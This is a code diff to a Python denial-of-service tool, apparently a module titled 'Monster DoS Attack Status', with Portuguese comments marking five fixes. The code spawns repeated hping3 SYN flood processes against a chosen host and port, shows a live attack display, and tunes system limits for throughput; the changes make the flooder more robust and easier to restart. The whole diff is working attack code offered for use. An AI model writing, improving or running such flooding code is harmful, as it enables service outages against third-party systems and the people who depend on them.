@@ -69,7 +69,7 @@ def get_random_header():
 
 ###########################
 # HPING3 SYN FLOOD ATTACK #
-##########################
+###########################
 def find_hping3():
     hping3_path = shutil.which("hping3")
     if hping3_path is None:
@@ -79,14 +79,14 @@ def find_hping3():
                 hping3_path = path
                 break
     if hping3_path is None:
-        print("[!] hping3 not found. Install it and try again.")
+        print("[!] hping3 not found. Install it and try again or correct its path to one of the following: /usr/sbin/hping3, /usr/bin/hping3, /sbin/hping3.")
         sys.exit(1)
     return hping3_path
 
 async def hping3_syn_task(host, port, hping3_path):
-    global processes
+    global processes, total_errors
     cmd = [hping3_path, "-S", "-p", str(port), "--flood", host]
-    while True:
+    while running:
         try:
             proc = await asyncio.create_subprocess_exec(
                 *cmd,
@@ -98,8 +98,7 @@ async def hping3_syn_task(host, port, hping3_path):
             await proc.wait()
         except asyncio.CancelledError:
             return
-        except KeyboardInterrupt:
-            return
+        # FIX 3: removido o "except KeyboardInterrupt" (código morto em asyncio)
         except Exception as e:
             with lock_counter:
                 total_errors += 1
@@ -113,16 +112,23 @@ async def hping3_syn_task(host, port, hping3_path):
 # DISPLAY #
 ###########
 def update_display(host, port, mode):
-    global start_time, running
+    global start_time, running, total_errors
+    # FIX 5: substituído os.system('clear') por escape ANSI (sem fork de subshell)
+    CLEAR = "\033[2J\033[H"
     while running:
         elapsed = time.time() - start_time
-        os.system('clear' if os.name == 'posix' else 'cls')
+        with lock_counter:
+            err = total_errors
+        print(CLEAR, end="")
         print("=" * 50)
         print("\033[0;35m  Monster DoS Attack Status (SYN Flood / hping3)")
         print("=" * 50)
         print(f"  Host:Port     : {host}:{port}")
         print(f"  Uptime (s)    : {int(elapsed)}")
         print(f"  Tasks         : {NUM_TASKS}")
+        # FIX 1: só mostra a linha de erros se houver erros (display limpo no caso normal)
+        if err:
+            print(f"  Errors        : {err}")
         print("=" * 50)
         print("\033[31m  [Press Ctrl+C to stop]")
         time.sleep(1)
@@ -133,6 +139,7 @@ def update_display(host, port, mode):
 async def main_attack(host, port):
     global start_time, running, processes
     start_time = time.time()
+    running = True  # FIX 2: garante estado limpo caso o módulo seja chamado mais de uma vez
     hping3_path = find_hping3()
     thread = threading.Thread(target=update_display, args=(host, port, "hping3"))
     thread.daemon = True
@@ -148,14 +155,16 @@ async def main_attack(host, port):
             for proc in processes:
                 try:
                     proc.terminate()
-                except:
+                except Exception:
                     pass
+        # FIX 4: dá um tempo curto para os processos morrerem antes de sair
+        await asyncio.sleep(0.2)
         thread.join(timeout=1)
         sys.exit(0)
 
-##############
-# RUNNER     #
-##############
+##########
+# RUNNER #
+##########
 def run(host, port, type):
     print(f"[DEBUG] run() called for {host}:{port} (type: {type})")
 
@@ -164,7 +173,7 @@ def run(host, port, type):
             subprocess.run("ulimit -n 65535", shell=True, check=False)
             subprocess.run("sysctl -w net.ipv4.ip_local_port_range='1024 65535'", shell=True, check=False, stderr=subprocess.DEVNULL)
             subprocess.run("sysctl -w net.ipv4.tcp_tw_reuse=1", shell=True, check=False, stderr=subprocess.DEVNULL)
-        except:
+        except Exception:
             pass
 
     try:
